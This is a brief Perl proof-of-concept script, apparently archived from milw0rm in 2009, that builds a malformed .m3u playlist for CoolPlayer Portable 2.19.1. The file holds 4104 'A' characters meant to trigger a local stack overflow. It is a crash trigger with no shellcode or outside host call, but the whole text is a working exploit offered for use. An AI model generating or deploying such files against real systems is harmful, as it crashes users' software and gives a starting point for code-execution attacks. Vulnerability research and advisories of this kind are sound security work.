# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ## ## ## ##  ##
# #  CoolPlayerp Portable 2.19.1 (.M3U File) Local Stack Overflow POC   # #
# ## ## ## ## ## ## ## ## ## ## ## ## ## ### ## ## ## ## ## ### ## ## ## ## 
my $chars= "A" x 4104;
my $file="goldm.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file has been created \n";
print "Thanx Tryag.Com";

# milw0rm.com [2009-04-20]